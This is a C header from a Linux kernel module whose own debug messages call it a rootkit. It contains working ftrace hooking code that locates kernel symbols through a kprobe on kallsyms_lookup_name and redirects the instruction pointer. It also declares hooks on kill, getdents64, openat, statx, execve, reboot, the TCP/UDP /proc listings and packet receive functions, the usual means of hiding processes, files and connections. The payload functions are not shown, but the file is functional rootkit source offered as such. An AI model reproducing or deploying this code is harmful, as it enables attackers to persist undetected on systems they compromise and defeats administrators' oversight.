#ifndef KITE_HOOK
    #define KITE_HOOK
#include "kite_init.h"

#include <linux/sched.h>
#include <linux/kprobes.h> // to probe kernel symbols
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/netdevice.h> // sk_buff, packet_type
/*
Note: hooking is achievable also with kprobe, for now ftrace is the choice for being more common 
If your kernel is built with CONFIG_OPTPROBES=y (currently this flag is automatically set 'y' on x86/x86-64,
non-preemptive kernel) and the "debug.kprobes_optimization" kernel parameter is set to 1 (see sysctl(8)),
Kprobes tries to reduce probe-hit overhead by using a jump instruction instead of a breakpoint instruction at each probepoint.
When a probe is registered, before attempting this optimization, Kprobes inserts an ordinary, breakpoint-based kprobe at the specified address.
So, even if it's not possible to optimize this particular probepoint, there'll be a probe there
Hooking is also achievable with changing the cr0 register to disable memory protection make the memory writable

can keep the hooks instead of having them in an array to have O(1) instead of O(n)
*/

const int ACTIVE_HOOKS_SIZE = 16; // Available number of hooks to store
typedef unsigned long (*kallsyms_lookup_name_t)(const char *); // the kallsyms_lookup_name function prototype pointer

#ifdef PTREGS_SYSCALL_STUB
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); // define type for syscalls functions, can be long even for int ret
ptregs_t orig_kill;
ptregs_t orig_getdents64;
ptregs_t orig_getdents;
ptregs_t orig_reboot;
ptregs_t orig_openat;
ptregs_t orig_statx;
ptregs_t orig_execve;
static asmlinkage ssize_t (*orig_pread64)(const struct pt_regs *regs);
// static asmlinkage ssize_t (*orig_read)(const struct pt_regs *regs);
#else
// remove arg names for definitions
static asmlinkage int (*orig_kill)(pid_t pid, int sig);
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage int (*orig_reboot)(int magic, int magic2, int cmd, void *arg);
static asmlinkage int (*orig_openat)(int dfd, const char *filename, int flags, umode_t mode);
static asmlinkage int (*orig_statx)(int dirfd, const char *restrict pathname, int flags, unsigned int mask, struct statx *restrict statxbuf);
static asmlinkage ssize_t (*orig_pread64)(unsigned int fd, char *buf, size_t count, loff_t pos);
// static asmlinkage ssize_t (*orig_read)(int fd, void *buf, size_t count);
static asmlinkage int (*orig_execve)(const char *pathname, char *const argv[], char *const envp[]);
#endif
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage int (*orig_packet_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
static asmlinkage int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);
static asmlinkage int (*orig_packet_rcv_spkt)(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev);


#define HOOK(_name, _hook, _orig)\
{					             \
	.name = _name,		         \
	.function = (_hook),		 \
	.original = (_orig),		 \
}


/* We need to prevent recursive loops when hooking, otherwise the kernel will
 * panic and hang. The options are to either detect recursion by looking at
 * the function return address, or by jumping over the ftrace call. We use the 
 * first option, by setting USE_FENTRY_OFFSET = 0, but could use the other by
 * setting it to 1. (Oridinarily ftrace provides it's own protections against
 * recursion, but it relies on saving return registers in $rip. We will likely
 * need the use of the $rip register in our hook, so we have to disable this
 * protection and implement our own).
 * */
#define USE_FENTRY_OFFSET 0

/* We pack all the information we need (name, hooking function, original function)
 * into this struct. This makes is easier for setting up the hook and just passing
 * the entire struct off to fh_install_hook() later on.
 * */
struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
	int activated;
};

/* Ftrace needs to know the address of the original function that we
 * are going to hook. We just use kallsyms_lookup_name() 
 * to find the address in kernel memory.
 * can also get its addres using user-space program to locate it in /proc/kallsyms and pass it with module_param(kallsyms_lookup_name_new, ulong, S_IRUGO)
 * */
static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
    static struct kprobe kp = {
    	.symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
    };

    #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 8, 0)
        kallsyms_lookup_name_t kallsyms_lookup_name_new;
		register_kprobe(&kp);
        kallsyms_lookup_name_new = (kallsyms_lookup_name_t)kp.addr; // get address of function
        hook->address = (unsigned long)kallsyms_lookup_name_new(hook->name); // get starting point of syscall table in memory
        unregister_kprobe(&kp);
    #elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) && LINUX_VERSION_CODE < KERNEL_VERSION(5, 8, 0)
        hook->address = (unsigned long*)kallsyms_lookup_name(hook->name); // find syscall table symlink and get table address
    #else
        hook->address = NULL;
#endif

	if (!hook->address)
	{
#ifdef KITE_DEBUG
		pr_info("rootkit: unresolved symbol: %s\n", hook->name);
#endif
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

/* See comment below within fh_install_hook() */
/* prepare the hook ftrace_ops function(the function that is called when registering the hook)
   to set the rip(instruction pointer) reg to the function we want to replace the original with to prevent recall and recursion.
   the notrace macro is to set function as non-traceable when tracing is enabled*/
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
	/* make a container to the hook to get its function to change to
	https://radek.io/2012/11/10/magical-container_of-macro/ */
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long) hook->function;
#else
	if(!within_module(parent_ip, THIS_MODULE)) // check that the called ftrace is called from the lkm
		regs->ip = (unsigned long) hook->function; // modify the rip reg to point to our function to set it later to be traced and recurse protected
#endif
}

/* Assuming we've already set hook->name, hook->function and hook->original, we 
 * can go ahead and install the hook with ftrace. This is done by setting the 
 * ops field of hook (see the comment below for more details), and then using
 * the built-in ftrace_set_filter_ip() and register_ftrace_function() functions
 * provided by ftrace.h
 * */
int fh_install_hook(struct ftrace_hook *hook)
{
	int err;
	err = fh_resolve_hook_address(hook); // get the original address of the function we want to hook
	if(err){
		return err;
	}
	/* For many of function hooks (especially non-trivial ones), the $rip
	 * register gets modified, so we have to alert ftrace to this fact. This
	 * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
	 * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
	 * the built-in anti-recursion guard provided by ftrace is useless if
	 * we're modifying $rip. This is why we have to implement our own checks
	 * (see USE_FENTRY_OFFSET). */
	hook->ops.func = (ftrace_func_t)fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
			| FTRACE_OPS_FL_RECURSION
			| FTRACE_OPS_FL_IPMODIFY;


	/*
	 * ftrace_set_filter_ip - set a function to filter on in ftrace by address
	 * @ops - the ops to set the filter with
	 * @ip - the address to add to or remove from the filter.
	 * @remove - non zero to remove the ip from the filter
	 * @reset - non zero to reset all filters before applying this filter.
	 *
	 * Filters denote which functions should be enabled when tracing is enabled
	 * If @ip is NULL, it failes to update filter.
	 */
	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0); // prepare the function to be traced by its address by setting a filter on the address with ops
	if(err)
	{
#ifdef KITE_DEBUG
		pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
#endif
		return err;
	}

	/**
 	* register_ftrace_function - register a function for profiling
 	* @ops - ops structure that holds the function for profiling.
 	*
 	* Register a function to be called by all functions in the
 	* kernel.
 	*
 	* Note: @ops->func and all the functions it calls must be labeled
 	*       with "notrace", otherwise it will go into a
 	*       recursive loop.
 	*/
	err = register_ftrace_function(&hook->ops); // start tracing the hook and set the callback function to the one specified in the hook->ops.func and apply to the filter
												// locking ftracing mutex to start changes and then unlocking it
	if(err)
	{
#ifdef KITE_DEBUG
		pr_info("rootkit: register_ftrace_function() failed: %d\n", err);
#endif
		return err;
	}

	return 0;
}

/* Disabling our function hook is just a simple matter of calling the built-in
 * unregister_ftrace_function() and ftrace_set_filter_ip() functions (note the
 * opposite order to that in fh_install_hook()).
 * */
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;
	if(hook->address != *((unsigned long *)hook->original) || hook->address == 0 || hook->original == 0){
		return;
	}
	err = unregister_ftrace_function(&hook->ops);
	if(err)
	{
#ifdef KITE_DEBUG
		pr_info("rootkit: unregister_ftrace_function() failed: %d\n", err);
#endif

	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0); // remove the address from ftrace filter
	if(err)
	{
#ifdef KITE_DEBUG
		pr_info("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
#endif

	}
}

/* To hook/unhook a specifiec function we iterate over the hooks array
 * and then call the fh_install_hook/fh_remove_hook on the function
 * can keep pass the hook itself to have O(1) instead of O(n)
 */

static int switch_hook(struct ftrace_hook *hooks, size_t count, char *symbol){
	int err;
	size_t i;

	for (i = 0; i < count; i++)
	{
		if(strcmp(hooks[i].name, symbol) == 0){
			if(hooks[i].activated == 1){
				fh_remove_hook(&hooks[i]);
				hooks[i].activated = 0;
			}

			else{
				err = fh_install_hook(&hooks[i]);
				if(err){
					goto error;
				}
				hooks[i].activated = 1;
			}
			return 0;
		}
	}
	return 1;

error:
	fh_remove_hook(&hooks[i]);
	return err;

}


static int is_hook_activated(struct ftrace_hook *hooks, size_t count, char *symbol){
	size_t i;

	for (i = 0; i < count; i++)
	{
		if(strcmp(hooks[i].name, symbol) == 0){
			return hooks[i].activated;
		}
	}
	return 0;
}


void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
	size_t i;
	for (i = 0 ; i < count ; i++)
		if(hooks[i].activated == 1){
			fh_remove_hook(&hooks[i]);
			hooks[i].activated = 0;
		}
}

#endif
